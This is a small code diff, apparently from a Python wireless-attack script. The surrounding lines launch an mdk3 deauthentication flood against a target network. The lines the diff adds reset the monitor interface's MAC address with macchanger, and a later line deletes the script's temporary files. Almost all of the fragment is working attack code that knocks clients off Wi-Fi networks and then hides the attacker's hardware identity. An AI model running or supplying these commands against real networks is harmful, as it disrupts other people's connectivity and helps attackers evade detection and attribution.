@@ -98,6 +98,9 @@ def start():
       
       print("############################# mdk3 attack! #######################################")
       os.system("monitor=`cat monitor.rmo` && tessid=`cat tessid.rmo` && mdk3 $monitor d -n '"+target+"'")
+      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor down")
+      os.system("monitor=`cat monitor.rmo` && macchanger -p $monitor")
+      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
       os.system('rm *.rmo && rm target*')
       
       
